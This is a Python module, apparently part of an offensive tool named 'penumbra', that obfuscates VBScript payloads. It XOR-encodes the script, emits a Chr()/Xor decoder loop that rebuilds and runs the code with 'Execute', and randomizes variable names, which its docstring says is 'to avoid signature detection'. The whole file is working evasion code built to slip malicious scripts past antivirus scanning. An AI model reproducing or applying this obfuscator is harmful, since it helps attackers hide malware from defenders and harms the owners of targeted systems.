"""VBS XOR encode pass — encodes payload string with Chr() decoder loop at runtime.

Each character is XOR'd with a single-byte key and the decoder reconstructs
the original string at runtime using Chr(Asc(Mid(encoded, i, 1)) Xor key).
Variable names are randomized to avoid signature detection.
"""

from __future__ import annotations

import secrets

from penumbra.types import PassConfig


def _rand_var() -> str:
    """Generate a randomized VBS variable name."""
    return "v" + secrets.token_hex(4)


class VbsEncodePass:
    """XOR-encode VBS payload with Chr() runtime decoder."""

    @property
    def name(self) -> str:
        return "encode"

    def apply(self, data: bytes, config: PassConfig) -> bytes:  # noqa: ARG002
        source = data.decode("utf-8")
        key = secrets.randbelow(254) + 1  # 1-255, avoid 0 (no-op)

        # XOR encode each character
        encoded_chars: list[str] = []
        for ch in source:
            encoded_chars.append(chr(ord(ch) ^ key))
        encoded_str = "".join(encoded_chars)

        # Escape for VBS string literal — double up any quotes
        vbs_encoded = encoded_str.replace('"', '""')

        v_encoded = _rand_var()
        v_decoded = _rand_var()
        v_i = _rand_var()
        v_key = _rand_var()

        decoder = (
            f'{v_key} = {key}\n'
            f'{v_encoded} = "{vbs_encoded}"\n'
            f'{v_decoded} = ""\n'
            f'For {v_i} = 1 To Len({v_encoded})\n'
            f'    {v_decoded} = {v_decoded} & '
            f'Chr(Asc(Mid({v_encoded}, {v_i}, 1)) Xor {v_key})\n'
            f'Next\n'
            f'Execute {v_decoded}\n'
        )
        return decoder.encode("utf-8")
